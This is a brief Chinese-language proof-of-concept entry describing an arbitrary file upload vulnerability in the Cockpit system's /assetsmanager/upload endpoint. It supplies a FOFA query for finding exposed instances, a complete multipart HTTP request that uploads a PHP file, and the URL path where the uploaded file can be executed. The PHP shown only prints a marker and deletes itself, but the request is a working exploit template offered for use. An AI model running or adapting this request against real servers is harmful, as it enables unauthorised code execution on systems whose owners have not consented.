## cockpit系统upload接口存在文件上传漏洞



## fofa

```
title="Authenticate Please!"
```



## poc

```
POST /assetsmanager/upload HTTP/1.1
Host: xxx.com
Content-Type: multipart/form-data; boundary=---------------------------36D28FBc36bd6feE7Fb3
Cookie: mysession=123451234512345123451234512345123
User-Agent: Mozilla/5.0 
Content-Length: 357

-----------------------------36D28FBc36bd6feE7Fb3
Content-Disposition: form-data; name="files[]"; filename="BE1a3e.php"
Content-Type: text/php

<?php echo "12131231231234e80test";unlink(__FILE__);?>
-----------------------------36D28FBc36bd6feE7Fb3
Content-Disposition: form-data; name="folder"


-----------------------------36D28FBc36bd6feE7Fb3--
```

![image-20240521201624377](./assets/202405212016419.png)

文件路径`http://127.0.0.1//storage/uploads/文件名.php`